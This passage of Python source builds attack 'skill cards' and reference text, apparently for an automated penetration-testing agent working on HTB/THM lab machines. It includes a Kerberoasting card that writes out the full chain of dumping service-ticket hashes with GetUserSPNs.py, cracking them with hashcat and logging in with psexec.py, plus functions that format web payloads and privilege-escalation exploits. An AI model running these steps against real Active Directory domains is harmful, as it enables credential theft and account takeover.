        "why": "Token impersonation is the #1 Windows privesc for service accounts (IIS, SQL, etc.)",
        "confidence": 0.95,
        "tags": ["privesc", "windows", "token-impersonation"],
        "source": "windows_privesc",
    })

    cards.append({
        "id": "windows_ad_kerberoasting",
        "if_condition": "Active Directory environment with domain user credentials",
        "then_action": "GetUserSPNs.py -dc-ip DC DOMAIN/user:pass → save TGS hashes → "
                       "hashcat -m 13100 hashes.txt wordlist.txt → crack service account passwords → "
                       "psexec.py DOMAIN/svc_account:password@TARGET",
        "why": "Kerberoasting extracts crackable service account hashes — often have admin privileges",
        "confidence": 0.90,
        "tags": ["ad", "kerberoasting", "windows"],
        "source": "ad_attacks",
    })

    return cards


def get_all_preseed_cards() -> List[Dict[str, Any]]:
    """Get ALL pre-seed skill cards combined."""
    all_cards = []
    all_cards.extend(generate_htb_skill_cards())
    all_cards.extend(generate_web_attack_skill_cards())
    all_cards.extend(generate_privesc_skill_cards())
    logger.debug(f"Generated {len(all_cards)} total pre-seed skill cards "
                f"(HTB/THM machines + web attacks + privesc)")
    return all_cards


def get_web_attack_reference() -> str:
    """Get formatted web attack reference for mentor prompts."""
    lines = ["=== WEB EXPLOITATION REFERENCE ==="]
    for attack_type, data in WEB_ATTACK_PATTERNS.items():
        lines.append(f"\n[{attack_type.upper()}] {data['description']}")
        if isinstance(data.get("detection"), list):
            lines.append("  Detection: " + " | ".join(data["detection"][:3]))
        if isinstance(data.get("payloads"), list):
            lines.append("  Payloads: " + " | ".join(data["payloads"][:3]))
    return "\n".join(lines)


def get_privesc_reference(os_type: str = "linux") -> str:
    """Get formatted privesc reference for mentor prompts."""
    if os_type == "windows":
        return json.dumps(WINDOWS_PRIVESC_TECHNIQUES, indent=2, default=str)[:2000]
    lines = ["=== LINUX PRIVILEGE ESCALATION REFERENCE ==="]
    for category, data in LINUX_PRIVESC_TECHNIQUES.items():
        lines.append(f"\n[{category.upper()}]")
        if isinstance(data.get("find_command"), str):
            lines.append(f"  Find: {data['find_command']}")
        elif isinstance(data.get("check_command"), str):
            lines.append(f"  Check: {data['check_command']}")
        if isinstance(data.get("common_exploitable"), dict):
            for binary, exploit in list(data["common_exploitable"].items())[:5]:
                lines.append(f"  {binary}: {exploit}")
    return "\n".join(lines)


# Need json for get_privesc_reference fallback
import json
